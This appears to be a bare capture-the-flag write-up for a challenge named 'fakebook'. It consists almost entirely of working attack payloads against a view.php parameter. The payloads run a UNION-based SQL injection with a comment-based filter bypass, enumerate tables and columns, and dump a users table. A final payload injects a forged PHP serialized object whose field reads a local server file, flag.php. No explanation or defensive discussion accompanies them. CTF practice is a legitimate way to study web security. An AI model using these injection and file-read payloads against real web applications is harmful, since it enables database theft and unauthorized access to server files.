# fakebook

```
/view.php?no=1'
/view.php?no=1#'
/view.php?no=1+order+by+4#
/view.php?no=1+order+by+5#
/view.php?no=1+union+select+1,2,3,4#
/view.php?no=1+union/**/select+1,2,3,4#
/view.php?no=-1+union/**/select+1,2,3,4#
/view.php?no=-1+union/**/select+1,group_concat(table_name),3,4+from+information_schema.tables+where+table_schema=database()#
/view.php?no=-1+union/**/select+1,group_concat(column_name),3,4+from+information_schema.columns+where+table_schema=database()#
/view.php?no=-1+union/**/select+1,group_concat(data),3,4+from+users#
```

`O:8:"UserInfo":3:{s:4:"name";s:4:"test";s:3:"age";i:10;s:4:"blog";s:8:"test.com";}`

```
view.php?no=-1+union/**/select+1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:4:"test";s:3:"age";i:10;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'#
```
